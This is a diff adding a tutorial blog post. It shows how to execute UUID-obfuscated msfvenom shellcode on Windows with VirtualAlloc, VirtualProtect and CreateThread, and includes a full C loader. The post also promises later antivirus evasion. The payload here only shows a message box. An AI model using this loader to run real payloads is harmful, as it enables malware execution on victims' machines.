@@ -1,0 +1,110 @@
+> This is an short and sweet post about how shellcode is executed. Def not the recommended method as every AV in their mother will detect it. But this is the base and we will keep building upon this
+# Requisites 
+Today is going to be so easy
+1. Windows API
+	- VirtualAlloc
+	- VirtualProtect
+	- CreateThread
+2. Payload Obfuscation [Previous Blog post](https://debug-diary.vercel.app/post/Payload_Obfuscation)
+
+# Payload Execution
+Today is the day we execute the payload we were so eager to save and hide for some time.
+
+This method used by the most advance malware like **Empire** and **Cobalt strike**. still it can be improved by using more advance stuff like 
+- `QueueUserAPC`, `NtCreateThreadEx`, `SetThreadContext` - adv threading.
+- `NtAllocateVirtualMemory`, `NtProtectVirtualMemory` - skipping winAPI
+which we will see in the future modules.
+
+1. Generating **shellcode**
+	- use the following command to Generate `MessageBox` shellcode that gets executed
+	- `msfvenom -p windows/messagebox TEXT="Hello" TITLE="Test" -f c -a x86`
+2. De obfuscating **UUID to shellcode**
+	- de obfuscating it manually right now but will build an DLL to do that in the future. [Previous Blog post](https://debug-diary.vercel.app/post/Payload_Obfuscation) to understand the code
+3. **Storing** the de obfuscated shellcode in Memory using `VirtualAlloc` 
+	- `VirtualAlloc` - it's a API function which can be used to allocate *page memory*, yes not stack or heap but it allocates memory in terms of pages.
+	- `void *temp = VirtualAlloc(0, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);`
+4. **Changing Permission** of the reserved memory
+	- Now if we see that when we allocated the memory we gave it the permission to *read and write operations* but in order to execute the code we need to set it to *executable*.
+	- `VirtualProtect((PVOID)shellcode, bytes, PAGE_EXECUTE_READWRITE, &dwOldProtection);`
+5. **Executing** via threads
+	- Now we will execute the shellcode in thread because, msfvenom generates shellcode in a way that at the end it exits in which ever environment it is. So if we don't use threads then it will exit from the process itself.
+6. **Executing** via pointers ( Optional )
+	- Now if you still want to execute it directly then you can convert the memory form *void pointer to function pointer*
+	- `((void (*)()) shellcode)()` - It dereferences automatically
+	- `(void (*)())` - An function pointer with no name
+	- `(... shellcode)()` - type conversion and executing it.
+
+*Just like a big boy i am not using any `if` statements to check if the function fails. But you should def use those.*
+
+```c
+#include <stdio.h>
+#include <windows.h>
+
+int main(){
+	
+	char UUID[26][37] = {
+        "FC4881E4-F0FF-41d4-a716-FFFFE8CC0000",
+        "00415141-5052-41d4-a716-4831D265488B",
+        "52605156-488B-41d4-a716-5218488B5220",
+        "488B7250-480F-41d4-a716-B74A4A4D31C9",
+        "4831C0AC-3C61-41d4-a716-7C022C2041C1",
+        "C90D4101-C1E2-41d4-a716-ED52488B5220",
+        "8B423C41-5148-41d4-a716-01D066817818",
+        "0B020F85-7200-41d4-a716-00008B808800",
+        "00004885-C074-41d4-a716-674801D0508B",
+        "4818448B-4020-41d4-a716-4901D0E35648",
+        "FFC9418B-3488-41d4-a716-4D31C94801D6",
+        "4831C0AC-41C1-41d4-a716-C90D4101C138",
+        "E075F14C-034C-41d4-a716-24084539D175",
+        "D858448B-4024-41d4-a716-4901D066418B",
+        "0C48448B-401C-41d4-a716-4901D0418B04",
+        "88415848-01D0-41d4-a716-41585E595A41",
+        "58415941-5A48-41d4-a716-83EC204152FF",
+        "E0584159-5A48-41d4-a716-8B12E94BFFFF",
+        "FF5DE80B-0000-41d4-a716-007573657233",
+        "322E646C-6C00-41d4-a716-5941BA4C7726",
+        "07FFD549-C7C1-41d4-a716-00000000E80E",
+        "0000005B-2B5D-41d4-a716-2052756E6E69",
+        "6E672E2E-005A-41d4-a716-E80900000053",
+        "75636B63-6573-41d4-a716-730041584831",
+        "C941BA45-8356-41d4-a716-07FFD54831C9",
+        "41BAF0B5-A256-41d4-a716-FFD500909090"
+};
+
+	int rows = sizeof(UUID) / sizeof(UUID[0]);
+	unsigned int bytes = rows * 12;
+	printf("Rows: %d, Bytes: %u\n", rows, bytes);
+	void *temp = VirtualAlloc(0, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	
+	printf("[+] Shellcode will be at - 0x%p", temp);
+	getchar();
+	unsigned char* shellcode = (unsigned char*)temp;
+	unsigned char* writer = shellcode;
+	
+	for (int i=0; i < rows; i++){
+		unsigned short segment[12];
+		int result = sscanf(UUID[i], "%02X%02X%02X%02X-%02X%02X-41d4-a716-%02X%02X%02X%02X%02X%02X", &segment[0], &segment[1], &segment[2], &segment[3], &segment[4], &segment[5], &segment[6], &segment[7], &segment[8], &segment[9], &segment[10], &segment[11]);
+				
+        for (int j=0; j < 12; j++){
+            *writer++ = (unsigned char)segment[j];
+        }
+	}
+
+	printf("[+] Running thread...\n");
+	DWORD dwOldProtection = 0;
+	VirtualProtect((PVOID)shellcode, bytes, PAGE_EXECUTE_READWRITE, &dwOldProtection);
+	HANDLE hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
+	WaitForSingleObject(hthread, INFINITE);
+    
+    printf("[+] Thread finished.\n");
+	VirtualFree(shellcode, bytes, MEM_RELEASE);
+	
+	return 0;
+}
+```
+![your internet sucks image not loaded](/images/ExecutingPayload-1.PNG)
+
+## vs Antivirus
+Not even going to test it as it's the most common method  to execute payload and *will get detected pretty easily*. But non the less we will see in the future how to make this method undetectable.
+
+This was an short post to understand how an shellcode is executed. But stay tuned an we only have few things to cover and we will be diving into some more windows internal and advance things.
